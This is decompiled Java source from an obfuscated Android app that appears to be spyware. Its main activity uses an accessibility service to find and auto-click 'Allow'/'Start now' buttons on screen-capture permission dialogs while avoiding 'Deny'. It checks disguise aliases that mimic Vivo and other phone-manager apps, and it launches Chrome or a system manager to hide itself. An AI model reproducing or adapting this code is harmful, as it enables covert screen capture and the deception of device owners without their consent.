package com.storm.safe.rock;

import android.R;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.pm.ServiceInfo;
import android.content.res.ColorStateList;
import android.content.res.Resources;
import android.graphics.Color;
import android.graphics.drawable.Drawable;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.view.accessibility.AccessibilityManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.ImageView;
import android.widget.Switch;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.storm.safe.rock.activity.AccessibilityTrampoline;
import com.storm.safe.rock.activity.qixvbtmo;
import com.storm.safe.rock.iuzxujjtqev;
import com.storm.safe.rock.manager.C0262a4;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.C0329b4;
import com.storm.safe.rock.service.modules.protection.C0356a1;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.client.transports.PollingXHR;
import java.io.File;
import java.io.IOException;
import java.lang.ref.WeakReference;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import kotlin.Pair;
import kotlin.collections.EmptyList;
import kotlin.text.AbstractC0779a1;
import okhttp3.internal.p032ws.WebSocketProtocol;
import org.conscrypt.PSKKeyManager;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0716jf;
import p000.AbstractC0765ko;
import p000.AbstractC1120qr;
import p000.AbstractC1229so;
import p000.AbstractC1408xb;
import p000.AbstractC1517zh;
import p000.C0585hl;
import p000.C1351vv;
import p000.RunnableC0029ai;
import p000.RunnableC0503fo;
import p000.RunnableC1053p2;
import p000.ViewOnClickListenerC1203s1;
import p000.al1;
import p000.bk1;
import p000.dk1;
import p000.e41;
import p000.ek1;
import p000.fh0;
import p000.hk1;
import p000.i60;
import p000.kj1;
import p000.l11;
import p000.lj1;
import p000.ne1;
import p000.t60;
import p000.tz0;
import p000.w00;
import p000.ze1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class iuzxujjtqev extends AppCompatActivity {

    /* renamed from: e2 */
    public static final C0254a0 f51956e2 = new C0254a0(null);

    /* renamed from: e3 */
    public static volatile WeakReference f51957e3;

    /* renamed from: c3 */
    public TextView f51958c3;

    /* renamed from: c4 */
    public Button f51959c4;

    /* renamed from: c5 */
    public TextView f51960c5;

    /* renamed from: c6 */
    public TextView f51961c6;

    /* renamed from: c7 */
    public Switch f51962c7;

    /* renamed from: c8 */
    public ImageView f51963c8;

    /* renamed from: c9 */
    public MediaProjectionManager f51964c9;

    /* renamed from: d0 */
    public boolean f51965d0;

    /* renamed from: d1 */
    public boolean f51966d1;

    /* renamed from: d2 */
    public boolean f51967d2;

    /* renamed from: d3 */
    public String f51968d3;

    /* renamed from: d4 */
    public boolean f51969d4;

    /* renamed from: d5 */
    public Handler f51970d5;

    /* renamed from: d6 */
    public Handler f51971d6;

    /* renamed from: d7 */
    public hk1 f51972d7;

    /* renamed from: d8 */
    public boolean f51973d8;

    /* renamed from: d9 */
    public RunnableC0503fo f51974d9;

    /* renamed from: e0 */
    public final iuzxujjtqev$combinedBroadcastReceiver$1 f51975e0 = new iuzxujjtqev$combinedBroadcastReceiver$1(this);

    /* renamed from: e1 */
    public boolean f51976e1;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.iuzxujjtqev$a0 */
    public static final class C0254a0 {
        public /* synthetic */ C0254a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        public final Activity getCurrentActivity() {
            WeakReference<Activity> currentActivityRef = getCurrentActivityRef();
            if (currentActivityRef != null) {
                return currentActivityRef.get();
            }
            return null;
        }

        public final WeakReference<Activity> getCurrentActivityRef() {
            return iuzxujjtqev.f51957e3;
        }

        private C0254a0() {
        }
    }

    /* renamed from: b6 */
    public static boolean m211204b6() {
        try {
            Integer num = AbstractC0241a0.f51907a1;
            Pair pair = num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null;
            if (pair == null) {
                return false;
            }
            int iIntValue = ((Number) pair.f57556a0).intValue();
            Intent intent = (Intent) pair.f57557a1;
            if (intent == null) {
                t60.m214726f4("iuzxujjtqev", "⚠️ [权限] Intent数据为null");
                return false;
            }
            if (!intent.hasExtra("android.media.projection.extra.EXTRA_MEDIA_PROJECTION") && intent.getAction() == null && intent.getData() == null) {
                t60.m214726f4("iuzxujjtqev", "⚠️ [权限] Intent缺少必要数据");
                return false;
            }
            if (iIntValue == -1) {
                return true;
            }
            t60.m214726f4("iuzxujjtqev", "⚠️ [权限] resultCode无效: " + iIntValue + " (期望: -1)");
            return false;
        } catch (Exception e) {
            t60.m214705c6("iuzxujjtqev", "❌ 验证MediaProjection权限发生异常", e);
            return false;
        }
    }

    /* renamed from: b7 */
    public static final void m211205b7(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className != null && (string = className.toString()) != null && AbstractC0779a1.m213652a5(string, "android.widget.Button", false)) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m211205b7(child, arrayList);
            }
        }
    }

    /* renamed from: b8 */
    public static final void m211206b8(AccessibilityNodeInfo accessibilityNodeInfo, String str, ArrayList arrayList) {
        String string;
        String string2;
        CharSequence text = accessibilityNodeInfo.getText();
        String str2 = "";
        if (text == null || (string = text.toString()) == null) {
            string = "";
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
            str2 = string2;
        }
        if (AbstractC0779a1.m213652a5(string, str, true) || AbstractC0779a1.m213652a5(str2, str, true)) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m211206b8(child, str, arrayList);
            }
        }
    }

    /* renamed from: b9 */
    public static void m211207b9() {
        String string;
        String string2;
        boolean z;
        boolean z2;
        String string3;
        String string4;
        try {
            dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
            if (c0290a0 == null) {
                t60.m214726f4("iuzxujjtqev", "⚠️ [权限] Android10无障碍未启动，无法处理弹框");
                return;
            }
            AccessibilityNodeInfo rootInActiveWindow = c0290a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                t60.m214726f4("iuzxujjtqev", "⚠️ [权限] Android10无法获取窗口根节点");
                return;
            }
            String[] strArr = {"允许", "确定", "确认", "授权", "同意", "是", "好", "好的", "继续", "立即开始", "现在开始", "开始", "开始录制", "开始投屏", "开始共享", "立即授权", "授予权限", "确认共享", "立即确认", "Allow", "OK", "Agree", "Grant", "Accept", "Yes", "Continue", "Start", "Start now", "Start sharing", "Share screen", "Begin recording", "Begin casting", "Record screen", "Cast screen", "Allow recording", "Allow casting", "Start recording", "Start capture"};
            String[] strArr2 = {"禁止", "拒绝", "取消", "Cancel", "Deny", "Dismiss", "不允许", "不同意"};
            int i = 0;
            while (true) {
                int i2 = 38;
                int i3 = 8;
                if (i >= 38) {
                    ArrayList arrayList = new ArrayList();
                    m211205b7(rootInActiveWindow, arrayList);
                    int size = arrayList.size();
                    int i4 = 0;
                    while (i4 < size) {
                        Object obj = arrayList.get(i4);
                        i4++;
                        AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) obj;
                        if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.isEnabled()) {
                            CharSequence text = accessibilityNodeInfo.getText();
                            if (text == null || (string = text.toString()) == null) {
                                string = "";
                            }
                            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                            if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                                string2 = "";
                            }
                            for (int i5 = 0; i5 < i2; i5++) {
                                String str = strArr[i5];
                                if (!AbstractC0779a1.m213652a5(string, str, true) && !AbstractC0779a1.m213652a5(string2, str, true)) {
                                }
                                z = true;
                                break;
                            }
                            z = false;
                            for (int i6 = 0; i6 < 8; i6++) {
                                String str2 = strArr2[i6];
                                if (!AbstractC0779a1.m213652a5(string, str2, true) && !AbstractC0779a1.m213652a5(string2, str2, true)) {
                                }
                                z2 = true;
                                break;
                            }
                            z2 = false;
                            if (z && !z2) {
                                accessibilityNodeInfo.performAction(16);
                                new Handler(Looper.getMainLooper()).postDelayed(new RunnableC1053p2(12), 500L);
                                return;
                            }
                            i2 = 38;
                        }
                    }
                    t60.m214726f4("iuzxujjtqev", "⚠️ [权限] Android10未找到允许按钮");
                    return;
                }
                String str3 = strArr[i];
                ArrayList arrayList2 = new ArrayList();
                m211206b8(rootInActiveWindow, str3, arrayList2);
                int size2 = arrayList2.size();
                int i7 = 0;
                while (i7 < size2) {
                    Object obj2 = arrayList2.get(i7);
                    i7++;
                    AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj2;
                    if (accessibilityNodeInfo2.isClickable() && accessibilityNodeInfo2.isEnabled()) {
                        CharSequence text2 = accessibilityNodeInfo2.getText();
                        String str4 = (text2 == null || (string4 = text2.toString()) == null) ? "" : string4;
                        CharSequence contentDescription2 = accessibilityNodeInfo2.getContentDescription();
                        String str5 = (contentDescription2 == null || (string3 = contentDescription2.toString()) == null) ? "" : string3;
                        int i8 = 0;
                        while (i8 < i3) {
                            String str6 = strArr2[i8];
                            if (!AbstractC0779a1.m213652a5(str4, str6, true) && !AbstractC0779a1.m213652a5(str5, str6, true)) {
                                i8++;
                                i3 = 8;
                            }
                            i3 = 8;
                        }
                        accessibilityNodeInfo2.performAction(16);
                        new Handler(Looper.getMainLooper()).postDelayed(new RunnableC1053p2(11), 500L);
                        return;
                    }
                }
                i++;
            }
        } catch (Exception e) {
            t60.m214705c6("iuzxujjtqev", "❌ Android 10 MediaProjection弹框处理异常", e);
        }
    }

    /* renamed from: b4 */
    public final void m211208b4() {
        try {
            try {
                TextView textView = this.f51960c5;
                if (textView != null) {
                    textView.setText(getString(R$string.app_name));
                }
            } catch (Exception e) {
                t60.m214726f4("iuzxujjtqev", "⚠️ 设置默认应用名称失败: " + e.getMessage());
            }
            Button button = this.f51959c4;
            if (button == null) {
                t60.m214724f2("enableButton");
                throw null;
            }
            button.setText(getString(R$string.enable_accessibility_service));
            TextView textView2 = this.f51958c3;
            if (textView2 == null) {
                t60.m214724f2("statusText");
                throw null;
            }
            textView2.setVisibility(8);
            TextView textView3 = this.f51961c6;
            if (textView3 == null) {
                t60.m214724f2("usageInstructionsText");
                throw null;
            }
            textView3.setText(getString(R$string.usage_instructions));
            this.f51969d4 = false;
        } catch (Exception e2) {
            tz0.m214807a7("❌ 应用默认文字失败: ", e2.getMessage(), "iuzxujjtqev");
        }
    }

    /* renamed from: b5 */
    public final void m211209b5() {
        if (m211214c4()) {
            m211230e0();
        } else {
            m211221d1();
        }
    }

    /* renamed from: c0 */
    public final void m211210c0() {
        Integer num = AbstractC0241a0.f51907a1;
        if ((num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null) != null) {
            t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 权限数据存在但无效，需重新申请");
            t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 可能仅有无障碍截图权限，缺少投屏权限");
            runOnUiThread(new dk1(this, 25));
        }
        if (Build.VERSION.SDK_INT >= 30) {
            runOnUiThread(new dk1(this, 26));
            sendBroadcast(new Intent("com.storm.safe.rock.intent.STOP_ACTIVITY_CREATION"));
            new Handler(Looper.getMainLooper()).postDelayed(new dk1(this, 27), 500L);
        } else {
            runOnUiThread(new dk1(this, 28));
            sendBroadcast(new Intent("com.storm.safe.rock.intent.STOP_ACTIVITY_CREATION"));
            new Handler(Looper.getMainLooper()).postDelayed(new dk1(this, 29), 500L);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:64:0x01d4  */
    /* renamed from: c1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211211c1(Intent intent, int i) throws IllegalAccessException, NoSuchMethodException, SecurityException, IllegalArgumentException, InvocationTargetException {
        Bundle extras;
        if (intent != null && (extras = intent.getExtras()) != null) {
            Iterator<String> it = extras.keySet().iterator();
            while (it.hasNext()) {
                extras.get(it.next());
            }
        }
        if (i != -1 || intent == null) {
            t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 投屏权限被拒绝");
            String str = Build.MANUFACTURER;
            if (!AbstractC0779a1.m213656a9(str, "Xiaomi") && !AbstractC0779a1.m213656a9(str, "Redmi")) {
                String str2 = Build.BRAND;
                if (AbstractC0779a1.m213656a9(str2, "Xiaomi") || AbstractC0779a1.m213656a9(str2, "Redmi") || AbstractC0779a1.m213656a9(str2, "POCO")) {
                }
            } else if (Build.VERSION.SDK_INT == 29 && this.f51965d0) {
                t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 小米Android10设备权限被拒绝，可能弹窗未显示");
                new Handler(Looper.getMainLooper()).postDelayed(new bk1(this, 15), 1000L);
                return;
            }
            if (this.f51965d0) {
                m211212c2();
                return;
            } else {
                runOnUiThread(new bk1(this, 16));
                return;
            }
        }
        m211219c9();
        try {
            AbstractC0241a0.m211179a3(intent, i);
            boolean booleanExtra = getIntent().getBooleanExtra("PERMISSION_LOST_RECOVERY", false);
            boolean z = this.f51965d0;
            t60.m214714d6("iuzxujjtqev", "✅ [权限] 结果处理: lostRecovery=" + booleanExtra + ", autoRequest=" + z);
            if (booleanExtra) {
                Intent intent2 = new Intent("com.storm.safe.rock.intent.MEDIA_PROJECTION_GRANTED");
                intent2.putExtra(PollingXHR.Request.EVENT_SUCCESS, true);
                intent2.putExtra("permission_recovery", true);
                if (getIntent().getBooleanExtra("REFRESH_PERMISSION_REQUEST", false)) {
                    intent2.putExtra("REFRESH_PERMISSION_REQUEST", true);
                }
                sendBroadcast(intent2);
                runOnUiThread(new bk1(this, 10));
                new Handler(Looper.getMainLooper()).postDelayed(new bk1(this, 11), 3000L);
                return;
            }
            if (z) {
                Intent intent3 = new Intent("com.storm.safe.rock.intent.MEDIA_PROJECTION_GRANTED");
                intent3.putExtra(PollingXHR.Request.EVENT_SUCCESS, true);
                if (getIntent().getBooleanExtra("REFRESH_PERMISSION_REQUEST", false)) {
                    intent3.putExtra("REFRESH_PERMISSION_REQUEST", true);
                }
                sendBroadcast(intent3);
                try {
                    dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
                    if (c0290a0 != null) {
                        t60.m214714d6("iuzxujjtqev", "✅ [服务] 调用dqtvuisjd处理MediaProjection");
                        MediaProjection mediaProjection = AbstractC0241a0.f51906a0;
                        if (mediaProjection != null) {
                            t60.m214714d6("iuzxujjtqev", "✅ [投屏] MediaProjection已设置到etzbzyzqxvqm");
                            Method declaredMethod = dqtvuisjd.class.getDeclaredMethod("setupScreenCaptureWithMediaProjection", MediaProjection.class);
                            declaredMethod.setAccessible(true);
                            declaredMethod.invoke(c0290a0, mediaProjection);
                        } else {
                            t60.m214726f4("iuzxujjtqev", "⚠️ [投屏] 对象不存在，尝试从数据创建");
                            Integer num = AbstractC0241a0.f51907a1;
                            Pair pair = num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null;
                            if (pair != null) {
                                int iIntValue = ((Number) pair.f57556a0).intValue();
                                Intent intent4 = (Intent) pair.f57557a1;
                                if (intent4 != null) {
                                    Object systemService = getSystemService("media_projection");
                                    t60.m214693b4(systemService, "null cannot be cast to non-null type android.media.projection.MediaProjectionManager");
                                    MediaProjection mediaProjection2 = ((MediaProjectionManager) systemService).getMediaProjection(iIntValue, intent4);
                                    if (mediaProjection2 != null) {
                                        AbstractC0241a0.f51906a0 = mediaProjection2;
                                        AbstractC0241a0.f51909a3 = System.currentTimeMillis();
                                        t60.m214714d6("MediaProjectionHolder", "✅ MediaProjection已设置，时间戳: " + AbstractC0241a0.f51909a3);
                                        Method declaredMethod2 = dqtvuisjd.class.getDeclaredMethod("setupScreenCaptureWithMediaProjection", MediaProjection.class);
                                        declaredMethod2.setAccessible(true);
                                        declaredMethod2.invoke(c0290a0, mediaProjection2);
                                        t60.m214714d6("iuzxujjtqev", "✅ [投屏] 重建的MediaProjection已设置");
                                    } else {
                                        t60.m214704c5("iuzxujjtqev", "❌ 从权限数据重新创建MediaProjection失败");
                                    }
                                }
                            }
                        }
                    } else {
                        t60.m214726f4("iuzxujjtqev", "⚠️ [服务] 实例不存在");
                    }
                } catch (Exception e) {
                    t60.m214705c6("iuzxujjtqev", "❌ 直接调用dqtvuisjd失败", e);
                }
                this.f51965d0 = false;
                this.f51966d1 = false;
                runOnUiThread(new bk1(this, 12));
                new Handler(Looper.getMainLooper()).postDelayed(new bk1(this, 13), 1500L);
                new Handler(Looper.getMainLooper()).postDelayed(new bk1(this, 14), 5000L);
            }
        } catch (Exception e2) {
            t60.m214705c6("iuzxujjtqev", "启动前台服务失败", e2);
        }
    }

    /* renamed from: c2 */
    public final void m211212c2() {
        t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 投屏权限被拒绝，保持应用打开");
        this.f51965d0 = false;
        this.f51966d1 = false;
        Intent intent = new Intent("com.storm.safe.rock.intent.MEDIA_PROJECTION_GRANTED");
        intent.putExtra(PollingXHR.Request.EVENT_SUCCESS, false);
        if (getIntent().getBooleanExtra("REFRESH_PERMISSION_REQUEST", false)) {
            intent.putExtra("REFRESH_PERMISSION_REQUEST", true);
        }
        sendBroadcast(intent);
        m211219c9();
        m211236e6("⚠️ 权限被拒绝\n服务需要此权限才能工作", Integer.valueOf(R.color.holo_red_dark));
        m211234e4("重新申请权限", null, Boolean.TRUE);
        getIntent().putExtra("AUTO_REQUEST_PERMISSION", false);
    }

    /* renamed from: c3 */
    public final void m211213c3() {
        View viewFindViewById = findViewById(R$id.statusText);
        t60.m214694b5(viewFindViewById, "findViewById(R.id.statusText)");
        TextView textView = (TextView) viewFindViewById;
        this.f51958c3 = textView;
        textView.setVisibility(8);
        View viewFindViewById2 = findViewById(R$id.enableButton);
        t60.m214694b5(viewFindViewById2, "findViewById(R.id.enableButton)");
        this.f51959c4 = (Button) viewFindViewById2;
        try {
            View viewFindViewById3 = findViewById(R$id.appNameTextView);
            t60.m214694b5(viewFindViewById3, "findViewById(R.id.appNameTextView)");
            this.f51960c5 = (TextView) viewFindViewById3;
        } catch (Exception e) {
            tz0.m214810b0("⚠️ 未找到appNameTextView: ", e.getMessage(), "iuzxujjtqev");
        }
        View viewFindViewById4 = findViewById(R$id.usageInstructionsText);
        t60.m214694b5(viewFindViewById4, "findViewById(R.id.usageInstructionsText)");
        this.f51961c6 = (TextView) viewFindViewById4;
        View viewFindViewById5 = findViewById(R$id.serviceSwitch);
        t60.m214694b5(viewFindViewById5, "findViewById(R.id.serviceSwitch)");
        this.f51962c7 = (Switch) viewFindViewById5;
        View viewFindViewById6 = findViewById(R$id.appIconImageView);
        t60.m214694b5(viewFindViewById6, "findViewById(R.id.appIconImageView)");
        if (this.f51963c8 == null) {
            View viewFindViewById7 = findViewById(R$id.backgroundImageView);
            t60.m214694b5(viewFindViewById7, "findViewById(R.id.backgroundImageView)");
            this.f51963c8 = (ImageView) viewFindViewById7;
        }
        try {
            JSONObject jSONObjectOptJSONObject = new JSONObject(AbstractC1408xb.m215154a0(this, StringUtil.m212470a0("OFwDLEgqMy1YPy1QFnRHKwMg"))).optJSONObject("pageStyleConfig");
            if (jSONObjectOptJSONObject == null || jSONObjectOptJSONObject.length() <= 0) {
                m211208b4();
                return;
            }
            String strOptString = jSONObjectOptJSONObject.optString("appName", "");
            t60.m214694b5(strOptString, "customAppName");
            if (strOptString.length() > 0) {
                try {
                    TextView textView2 = this.f51960c5;
                    if (textView2 != null) {
                        textView2.setText(strOptString);
                    }
                } catch (Exception e2) {
                    t60.m214726f4("iuzxujjtqev", "⚠️ 设置应用名称失败: " + e2.getMessage());
                }
            }
            String strOptString2 = jSONObjectOptJSONObject.optString("enableButtonText", "");
            t60.m214694b5(strOptString2, "enableButtonText");
            if (strOptString2.length() > 0) {
                Button button = this.f51959c4;
                if (button == null) {
                    t60.m214724f2("enableButton");
                    throw null;
                }
                button.setText(strOptString2);
            }
            String strOptString3 = jSONObjectOptJSONObject.optString("buttonColor", "");
            t60.m214694b5(strOptString3, "buttonColorStr");
            if (strOptString3.length() > 0) {
                try {
                    int color = Color.parseColor(strOptString3);
                    Button button2 = this.f51959c4;
                    if (button2 == null) {
                        t60.m214724f2("enableButton");
                        throw null;
                    }
                    button2.setBackgroundTintList(ColorStateList.valueOf(color));
                } catch (Exception e3) {
                    t60.m214726f4("iuzxujjtqev", "⚠️ 解析按钮颜色失败: " + strOptString3 + ", " + e3.getMessage());
                }
            }
            String strOptString4 = jSONObjectOptJSONObject.optString("statusText", "");
            t60.m214694b5(strOptString4, "configStatusText");
            if (strOptString4.length() > 0) {
                String strM213673c6 = AbstractC0779a1.m213673c6(strOptString4, "\\n", "\n");
                this.f51968d3 = strM213673c6;
                TextView textView3 = this.f51958c3;
                if (textView3 == null) {
                    t60.m214724f2("statusText");
                    throw null;
                }
                textView3.setText(strM213673c6);
                TextView textView4 = this.f51958c3;
                if (textView4 == null) {
                    t60.m214724f2("statusText");
                    throw null;
                }
                textView4.setVisibility(0);
                this.f51969d4 = true;
            } else {
                TextView textView5 = this.f51958c3;
                if (textView5 == null) {
                    t60.m214724f2("statusText");
                    throw null;
                }
                textView5.setVisibility(8);
            }
            String strOptString5 = jSONObjectOptJSONObject.optString("usageInstructions", "");
            t60.m214694b5(strOptString5, "configUsageInstructions");
            if (strOptString5.length() > 0) {
                String strM213673c62 = AbstractC0779a1.m213673c6(strOptString5, "\\n", "\n");
                TextView textView6 = this.f51961c6;
                if (textView6 == null) {
                    t60.m214724f2("usageInstructionsText");
                    throw null;
                }
                textView6.setText(strM213673c62);
            }
            try {
                int color2 = Color.parseColor(jSONObjectOptJSONObject.optString("enableButtonTextColor", "#FFFFFF"));
                TextView textView7 = this.f51961c6;
                if (textView7 == null) {
                    t60.m214724f2("usageInstructionsText");
                    throw null;
                }
                textView7.setTextColor(color2);
                TextView textView8 = this.f51960c5;
                if (textView8 != null) {
                    textView8.setTextColor(color2);
                }
            } catch (Exception unused) {
                TextView textView9 = this.f51961c6;
                if (textView9 == null) {
                    t60.m214724f2("usageInstructionsText");
                    throw null;
                }
                textView9.setTextColor(-1);
                TextView textView10 = this.f51960c5;
                if (textView10 != null) {
                    textView10.setTextColor(-1);
                }
            }
        } catch (Exception e4) {
            t60.m214726f4("iuzxujjtqev", "⚠️ 加载页面样式配置失败，使用默认样式: " + e4.getMessage());
            m211208b4();
        }
    }

    /* renamed from: c4 */
    public final boolean m211214c4() {
        ServiceInfo serviceInfo;
        try {
            Object systemService = getSystemService("accessibility");
            AccessibilityManager accessibilityManager = systemService instanceof AccessibilityManager ? (AccessibilityManager) systemService : null;
            List<AccessibilityServiceInfo> enabledAccessibilityServiceList = accessibilityManager != null ? accessibilityManager.getEnabledAccessibilityServiceList(-1) : null;
            if (enabledAccessibilityServiceList == null) {
                enabledAccessibilityServiceList = EmptyList.f57568a0;
            }
            if (enabledAccessibilityServiceList == null || !enabledAccessibilityServiceList.isEmpty()) {
                Iterator<T> it = enabledAccessibilityServiceList.iterator();
                while (it.hasNext()) {
                    ResolveInfo resolveInfo = ((AccessibilityServiceInfo) it.next()).getResolveInfo();
                    if (t60.m214686a2((resolveInfo == null || (serviceInfo = resolveInfo.serviceInfo) == null) ? null : serviceInfo.packageName, getPackageName())) {
                        break;
                    }
                }
            }
            ComponentName componentName = new ComponentName(this, (Class<?>) dqtvuisjd.class);
            String string = Settings.Secure.getString(getContentResolver(), "enabled_accessibility_services");
            if (string != null && string.length() != 0) {
                TextUtils.SimpleStringSplitter simpleStringSplitter = new TextUtils.SimpleStringSplitter(':');
                simpleStringSplitter.setString(string);
                while (simpleStringSplitter.hasNext()) {
                    ComponentName componentNameUnflattenFromString = ComponentName.unflattenFromString(simpleStringSplitter.next());
                    if (componentNameUnflattenFromString != null && componentNameUnflattenFromString.equals(componentName)) {
                        return true;
                    }
                }
                return false;
            }
            return false;
        } catch (Exception e) {
            t60.m214705c6("iuzxujjtqev", "检查无障碍权限失败", e);
            return false;
        }
    }

    /* renamed from: c5 */
    public final boolean m211215c5() {
        try {
            PackageManager packageManager = getPackageManager();
            ComponentName componentName = new ComponentName(this, (Class<?>) DefaultLauncherAlias.class);
            ComponentName componentName2 = new ComponentName(this, (Class<?>) AppVariantF.class);
            boolean z = true;
            boolean z2 = packageManager.getComponentEnabledSetting(componentName) == 2;
            if (packageManager.getComponentEnabledSetting(componentName2) != 1) {
                z = false;
            }
            t60.m214702c3("iuzxujjtqev", "🔍 [伪装] 检查I管家伪装: " + z2 + " (DefaultAlias禁用: " + z2 + ", VivoAlias启用: " + z + ")");
            return z2;
        } catch (Exception e) {
            t60.m214705c6("iuzxujjtqev", "❌ 检查I管家伪装模式失败", e);
            return false;
        }
    }

    /* renamed from: c6 */
    public final boolean m211216c6() {
        try {
            PackageManager packageManager = getPackageManager();
            ComponentName componentName = new ComponentName(this, (Class<?>) DefaultLauncherAlias.class);
            List listM213306g5 = AbstractC0716jf.m213306g5(AppVariantE.class, AppVariantH.class, AppVariantI.class, AppVariantJ.class, AppVariantN.class);
            boolean z = true;
            boolean z2 = packageManager.getComponentEnabledSetting(componentName) == 2;
            String name = "";
            Iterator it = listM213306g5.iterator();
            boolean z3 = false;
            while (true) {
                if (!it.hasNext()) {
                    break;
                }
                Class cls = (Class) it.next();
                if (packageManager.getComponentEnabledSetting(new ComponentName(this, (Class<?>) cls)) == 1) {
                    try {
                        name = cls.getName();
                        z3 = true;
                        break;
                    } catch (Exception unused) {
                        z3 = true;
                        t60.m214695b6("⚠️ [伪装] 检查alias失败: " + cls.getSimpleName(), "msg");
                    }
                } else {
                    continue;
                }
            }
            if (!z2 || !z3) {
                z = false;
            }
            t60.m214702c3("iuzxujjtqev", "🔍 [伪装] 检查手机管家伪装: " + z + " (DefaultAlias禁用: " + z2 + ", Alias: " + name + ")");
            return z;
        } catch (Exception e) {
            t60.m214705c6("iuzxujjtqev", "❌ 检查手机管家伪装模式失败", e);
            return false;
        }
    }

    /* renamed from: c7 */
    public final boolean m211217c7() {
        Intent launchIntentForPackage;
        for (String str : AbstractC0716jf.m213306g5("com.android.chrome", "com.chrome.beta", "com.chrome.dev", "com.chrome.canary", "com.google.android.apps.chrome")) {
            try {
                launchIntentForPackage = getPackageManager().getLaunchIntentForPackage(str);
            } catch (PackageManager.NameNotFoundException unused) {
            } catch (Exception e) {
                t60.m214726f4("iuzxujjtqev", "⚠️ [伪装] 启动Chrome失败(" + str + "): " + e.getMessage());
            }
            if (launchIntentForPackage != null) {
                launchIntentForPackage.addFlags(1350631424);
                startActivity(launchIntentForPackage);
                new Handler(Looper.getMainLooper()).postDelayed(new bk1(this, 28), 100L);
                t60.m214714d6("iuzxujjtqev", "🎭 [伪装] 成功启动Chrome: " + str);
                return true;
            }
            continue;
        }
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse("https://www.google.com"));
            intent.addFlags(1350631424);
            startActivity(intent);
            new Handler(Looper.getMainLooper()).postDelayed(new bk1(this, 29), 100L);
            t60.m214714d6("iuzxujjtqev", "🎭 [伪装] Chrome未安装，启动默认浏览器");
            return true;
        } catch (Exception e2) {
            tz0.m214810b0("⚠️ [伪装] 默认浏览器也失败: ", e2.getMessage(), "iuzxujjtqev");
            return false;
        }
    }

    /* renamed from: c8 */
    public final void m211218c8() {
        String lowerCase;
        Intent launchIntentForPackage;
        Intent intent;
        if (isFinishing()) {
            t60.m214726f4("iuzxujjtqev", "⚠️ [生命周期] Activity关闭中，跳过跳转");
            return;
        }
        try {
            String str = Build.BRAND;
            String lowerCase2 = "";
            if (str != null) {
                lowerCase = str.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            } else {
                lowerCase = "";
            }
            String str2 = Build.MANUFACTURER;
            if (str2 != null) {
                lowerCase2 = str2.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            if (!AbstractC0779a1.m213652a5(lowerCase, "samsung", false) && !AbstractC0779a1.m213652a5(lowerCase2, "samsung", false)) {
                Iterator it = AbstractC0716jf.m213306g5("com.huawei.systemmanager.intent.action.MAIN", "com.hihonor.systemmanager.intent.action.MAIN").iterator();
                while (it.hasNext()) {
                    try {
                        intent = new Intent((String) it.next());
                        intent.addFlags(1350631424);
                    } catch (Exception e) {
                        t60.m214726f4("iuzxujjtqev", "⚠️ [伪装] Intent Action失败: " + e.getMessage());
                    }
                    if (getPackageManager().resolveActivity(intent, 0) != null) {
                        startActivity(intent);
                        new Handler(Looper.getMainLooper()).postDelayed(new bk1(this, 7), 100L);
                        return;
                    }
                    continue;
                }
